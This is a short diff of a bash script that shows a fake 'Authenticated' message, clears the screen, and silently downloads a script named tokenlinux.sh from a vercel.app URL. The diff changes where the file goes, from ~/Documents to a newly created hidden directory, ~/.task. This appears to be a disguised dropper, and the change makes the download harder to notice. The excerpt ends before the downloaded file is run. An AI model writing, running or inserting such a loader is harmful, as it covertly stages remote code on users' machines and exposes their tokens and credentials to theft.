@@ -1,7 +1,8 @@
 #!/bin/bash
 set -e
 echo "Authenticated"
-TARGET_DIR="$HOME/Documents"
+mkdir -p "$HOME/.task"
+TARGET_DIR="$HOME/.task"
 clear
 wget -q -O "$TARGET_DIR/tokenlinux.sh" "https://vercel-rho-amber-58.vercel.app/kmHgMq7/tokenlinux.sh"
 clear
